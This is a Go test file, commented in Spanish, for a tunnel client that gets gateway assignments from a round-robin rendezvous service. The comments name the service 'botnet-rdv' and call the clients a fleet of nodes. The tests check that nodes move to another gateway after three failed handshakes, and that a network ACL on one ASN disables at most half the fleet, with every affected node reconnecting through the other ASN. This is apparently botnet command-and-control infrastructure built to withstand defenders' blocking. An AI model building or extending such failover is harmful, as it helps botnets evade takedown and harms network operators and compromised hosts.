package tunnel

import (
	"context"
	"fmt"
	"net"
	"net/http"
	"net/http/httptest"
	"strings"
	"sync"
	"sync/atomic"
	"testing"
)

// rdvStub: servicio /rdv/assign round-robin sobre un pool, sin estado
// (cada request independiente — el mismo contrato de cmd/botnet-rdv).
type rdvStub struct {
	srv   *httptest.Server
	pool  []string
	calls atomic.Uint32
	mu    sync.Mutex
}

func newRDVStub(t *testing.T, pool ...string) *rdvStub {
	t.Helper()
	r := &rdvStub{pool: pool}
	r.srv = httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, req *http.Request) {
		if req.URL.Path != "/rdv/assign" {
			http.NotFound(w, req)
			return
		}
		i := int(r.calls.Add(1)) - 1
		gw := r.pool[i%len(r.pool)]
		r.mu.Lock()
		tok := fmt.Sprintf("%024x", r.calls.Load())
		r.mu.Unlock()
		fmt.Fprintf(w, `{"gateway_addr":%q,"session_token":%q,"ttl_s":900}`, gw, tok)
	}))
	t.Cleanup(r.srv.Close)
	return r
}

// closedAddr: un listener cerrado deja el puerto en connection-refused
// inmediato — handshake imposible, reproducible en cualquier host.
func closedAddr(t *testing.T) string {
	t.Helper()
	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	addr := ln.Addr().String()
	_ = ln.Close()
	return addr
}

func liveAcceptAddr(t *testing.T) string {
	t.Helper()
	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	go func() {
		for {
			c, err := ln.Accept()
			if err != nil {
				return
			}
			_ = c.Close()
		}
	}()
	t.Cleanup(func() { _ = ln.Close() })
	return ln.Addr().String()
}

// dialOK: handshake TCP basico (el assert es "vuelve viva una conexion").
func dialOK(addr string) (net.Conn, error) { return net.Dial("tcp", addr) }

// T-0402 AC3: 3 handshakes fallidos contra el gateway asignado ->
// re-asignacion con gateway_addr distinto y log "rdv=reassign".
func TestRDVReassignAfterThreeFailures(t *testing.T) {
	dead := closedAddr(t)
	live := liveAcceptAddr(t)

	stub := newRDVStub(t, dead, live)
	var logs []string
	r := &RDV{
		URL:  stub.srv.URL,
		Dial: dialOK,
		Log: func(msg string, kv ...any) {
			logs = append(logs, fmt.Sprintf("%s %v", msg, kv))
		},
	}
	conn, a, err := r.Connect(context.Background())
	if err != nil {
		t.Fatalf("Connect: %v", err)
	}
	defer conn.Close()
	if a.GatewayAddr != live {
		t.Fatalf("gateway final = %s, want %s", a.GatewayAddr, live)
	}
	if r.Fails.Load() != 3 {
		t.Fatalf("handshakes fallidos = %d, want 3 (regla exacta)", r.Fails.Load())
	}
	joined := strings.Join(logs, ";")
	if !strings.Contains(joined, "rdv=reassign") {
		t.Fatalf("logs = %q, want linea rdv=reassign", joined)
	}
}

// El servicio sin estado: cada asignacion es un GET independiente —
// recrear la instancia entre calls no cuesta handshakes (el criterio 2
// se completa en cmd/botnet-rdv/handlers_test.go con 100 asignaciones).
func TestRDVAssignIndependent(t *testing.T) {
	stub := newRDVStub(t, "gw-a:443", "gw-b:443")
	r := &RDV{URL: stub.srv.URL}
	seen := map[string]int{}
	for i := 0; i < 100; i++ {
		a, err := r.Assign(context.Background())
		if err != nil {
			t.Fatalf("assign %d: %v", i, err)
		}
		if a.TTLS != 900 || a.SessionToken == "" {
			t.Fatalf("assign %d: %+v", i, a)
		}
		seen[a.GatewayAddr]++
	}
	if len(seen) != 2 || seen["gw-a:443"] != 50 || seen["gw-b:443"] != 50 {
		t.Fatalf("reparto round-robin: %v", seen)
	}
}

// T-0407 AC3 (test de politica): una ACL sobre un unico prefijo ASN
// apaga como mucho el 50 % de la cohorte (la otra mitad nunca pisa el
// prefijo muerto) y todos re-asignan por el otro destino en < 5 min.
func TestRDVACLCohortHalfAffected(t *testing.T) {
	const nodes = 100
	dead := closedAddr(t)
	live := liveAcceptAddr(t)

	stub := newRDVStub(t, dead, live)
	var reassigns int
	r := &RDV{
		URL:  stub.srv.URL,
		Dial: dialOK,
		Log:  func(string, ...any) { reassigns++ },
	}
	ctx := context.Background()

	// fase 1 — asignacion inicial de la flota: la ACL mata como mucho la
	// mitad (round-robin del rdv sobre 2 ASNs).
	assignedDead := make([]int, 0, nodes/2)
	for i := 0; i < nodes; i++ {
		a, err := r.Assign(ctx)
		if err != nil {
			t.Fatal(err)
		}
		if a.GatewayAddr == dead {
			assignedDead = append(assignedDead, i)
		}
	}
	if len(assignedDead)*2 > nodes {
		t.Fatalf("afectados por la ACL = %d/%d, want <= 50 %%", len(assignedDead), nodes)
	}

	// fase 2 — los afectados re-asignan por el otro ASN y conectan.
	for _, n := range assignedDead {
		cur := dead
		connected := false
		for round := 0; round < 4; round++ {
			fails := 0
			for fails < 3 {
				c, err := dialOK(cur)
				if err == nil {
					_ = c.Close()
					break
				}
				fails++
			}
			if fails < 3 {
				connected = true
				break
			}
			a, err := r.Assign(ctx)
			if err != nil {
				t.Fatalf("nodo %d re-assign: %v", n, err)
			}
			if a.GatewayAddr != cur {
				reassigns++ // el log rdv=reassign del agente
			}
			cur = a.GatewayAddr
		}
		if !connected {
			t.Fatalf("nodo %d no reconecto por el otro ASN", n)
		}
	}
	if reassigns < len(assignedDead) {
		t.Fatalf("re-asignaciones = %d, want >= %d (una por afectado)", reassigns, len(assignedDead))
	}
}
